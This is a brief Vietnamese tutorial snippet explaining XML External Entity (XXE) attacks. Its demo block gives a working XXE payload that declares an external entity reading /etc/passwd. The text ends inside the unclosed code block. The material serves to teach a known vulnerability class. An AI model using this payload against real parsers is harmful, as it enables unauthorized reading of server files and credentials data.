## XXE là gì?

Tấn công XXE (XML External Entity) là lỗi bảo mật xảy ra khi parser XML xử lý các entity bên ngoài...

**Demo:**

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
